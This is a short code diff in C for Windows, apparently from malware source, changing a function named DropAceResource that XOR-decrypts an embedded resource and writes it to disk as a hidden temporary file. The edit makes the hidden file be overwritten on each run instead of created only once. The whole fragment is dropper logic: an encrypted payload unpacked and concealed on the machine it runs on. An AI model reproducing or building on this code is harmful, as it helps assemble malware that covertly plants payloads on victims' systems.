@@ -44,7 +44,7 @@ VOID DropAceResource(HMODULE hModule) { // Checks omitted
 	decryptData.decryptedData = XorBytes(decAddr, decryptData.sizeData, XOR_ACE_KEY);
 
 	if (decryptData.decryptedData && decryptData.sizeData) {
-		hHandle = CreateFile(tmpFile, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
+		hHandle = CreateFile(tmpFile, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
 		WriteFile(hHandle, decryptData.decryptedData, decryptData.sizeData, &bytesWritten, NULL);
 		CloseHandle(hHandle);
 	}
